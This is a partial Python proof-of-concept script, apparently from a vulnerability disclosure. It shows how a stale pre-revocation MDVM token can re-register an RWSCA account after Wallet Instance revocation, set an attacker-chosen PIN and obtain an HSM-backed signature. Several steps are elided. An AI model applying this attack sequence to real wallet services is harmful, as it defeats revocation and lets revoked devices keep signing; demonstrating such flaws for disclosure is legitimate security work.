...
def main():
    print("=== RWSCA post-revocation resurrection E2E PoC ===")
    mdvm_key = ec.generate_private_key(ec.SECP256R1())

    print("[1/10] Register MDVM and retain pre-revocation token")
    ...
    print("[2/10] Register WPB and save revocation code")
    ...
    print("[3/10] Register initial RWSCA account")
    rwsca_challenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
    rwsca_headers = {
        "Auth-Challenge": rwsca_challenge,
        "Mdvm-Token": stale_mdvm_token,
    }
    initial_rwsca = signed_request(
        "POST", "/v1/rwsca/register", rwsca_headers,
        [("rwsca-auth-sig", "wi-mdvm-auth-key", RWSCA_REGISTER_FIELDS, mdvm_key)],
    ).json()["rwsca_account_id"]
    print(f"    initial_rwsca_account_id={initial_rwsca}")

    print("[4/10] Delete RWSCA account before wallet revocation")
    delete_challenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
    delete_headers = {
        "Rwsca-Account-Id": initial_rwsca,
        "Auth-Challenge": delete_challenge,
        "Mdvm-Token": stale_mdvm_token,
    }
    signed_request(
        "DELETE", "/v1/rwsca/deleteAccount", delete_headers,
        [("rwsca-auth-sig", "wi-mdvm-auth-key", RWSCA_DELETE_FIELDS, mdvm_key)],
        expected=(204,),
    )

    print("[5/10] Revoke Wallet Instance through WPB")
...
def post_revocation(stale_mdvm_token, mdvm_key, initial_rwsca):
    print("[6/10] Re-register RWSCA using the PRE-REVOCATION MDVM token")
    ...
    print("[7/10] Initialize attacker-chosen new PIN factor")
    ...
    print("[8/10] Create fresh HSM-backed key and WTE after revocation")
    ...
    print("[9/10] Ask RWSCA HSM to sign data after wallet revocation")
    ...
    print("[10/10] Verify returned ECDSA signature locally")
    ...
    print()
    print("CONFIRMED_E2E:")
    print("RWSCA performed a cryptographically valid HSM-backed signature AFTER Wallet Instance revocation")
    print(f"initial_rwsca_account_id={initial_rwsca}")
    print(f"resurrected_rwsca_account_id={new_rwsca}")
